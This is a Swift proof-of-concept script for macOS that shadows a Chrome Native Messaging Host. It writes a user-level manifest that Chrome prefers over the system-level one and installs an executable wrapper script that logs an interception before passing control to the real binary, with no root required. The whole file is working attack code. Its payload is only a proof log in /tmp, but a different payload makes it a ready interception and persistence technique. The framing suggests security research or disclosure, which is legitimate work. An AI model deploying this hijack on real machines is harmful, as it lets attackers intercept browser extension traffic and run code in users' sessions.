import Foundation

let fm = FileManager.default
let home = fm.homeDirectoryForCurrentUser.path

// ── Configuration ──────────────────────────────────────────
// Change these to target any NMH extension on the system.
// Run: ls /Library/Google/Chrome/NativeMessagingHosts/
//      ls ~/Library/Application\ Support/Google/Chrome/NativeMessagingHosts/
// to discover installed NMH manifests, then fill in below.

let nmhName = "com.example.nmh"                        // name field from the target manifest
let extensionId = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"   // Chrome extension ID from allowed_origins
let realBinary = "/opt/example-agent/nmh-bridge"        // path to the real NMH binary being shadowed

// ── Derived paths (don't edit) ─────────────────────────────
let nmhDir = "\(home)/Library/Application Support/Google/Chrome/NativeMessagingHosts"
let nmhConfig = "\(nmhDir)/\(nmhName).json"
let wrapperPath = "\(home)/Library/Application Support/nmh-wrapper.sh"
let proofLog = "/tmp/nmh_proof.txt"

// Shadow NMH manifest - Chrome reads user-level before system-level
let nmhJson = """
{
    "name": "\(nmhName)",
    "description": "NMH Bridge",
    "path": "\(wrapperPath)",
    "type": "stdio",
    "allowed_origins": [ "chrome-extension://\(extensionId)/" ]
}
"""

// Wrapper - logs proof of interception, then passes through to the real binary
let wrapperScript = """
#!/bin/bash
echo "[$(date)] NMH shadow hit - intercepted \(nmhName)" >> \(proofLog)
exec "\(realBinary)" "$@"
"""

// Step 1: Create user-level NMH directory
do {
    try fm.createDirectory(atPath: nmhDir, withIntermediateDirectories: true)
    print("[OK] Created NMH directory: \(nmhDir)")
} catch {
    print("[ERROR] Failed to create NMH directory: \(error.localizedDescription)")
    exit(1)
}

// Step 2: Write shadow NMH manifest
do {
    try nmhJson.write(toFile: nmhConfig, atomically: true, encoding: .utf8)
    print("[OK] Shadow manifest written to \(nmhConfig)")
} catch {
    print("[ERROR] Failed to write manifest: \(error.localizedDescription)")
    exit(1)
}

// Step 3: Write wrapper script
do {
    try wrapperScript.write(toFile: wrapperPath, atomically: true, encoding: .utf8)
    print("[OK] Wrapper written to \(wrapperPath)")
} catch {
    print("[ERROR] Failed to write wrapper: \(error.localizedDescription)")
    exit(1)
}

// Step 4: chmod +x the wrapper
do {
    try fm.setAttributes([.posixPermissions: 0o755], ofItemAtPath: wrapperPath)
    print("[OK] Set executable permissions on wrapper")
} catch {
    print("[ERROR] Failed to set permissions: \(error.localizedDescription)")
    exit(1)
}

print("\n[DONE] NMH shadow deployed (no root required)")
print("  Shadow manifest : \(nmhConfig)")
print("  Wrapper script  : \(wrapperPath)")
print("  Proof log       : \(proofLog)")
print("\n[NEXT] Quit Chrome completely and reopen.")
print("  The extension will now load through the wrapper.")
print("  Verify: cat \(proofLog)")
print("\n[CLEANUP]")
print("  rm \"\(nmhConfig)\"")
print("  rm \"\(wrapperPath)\"")
print("  rm \(proofLog)")
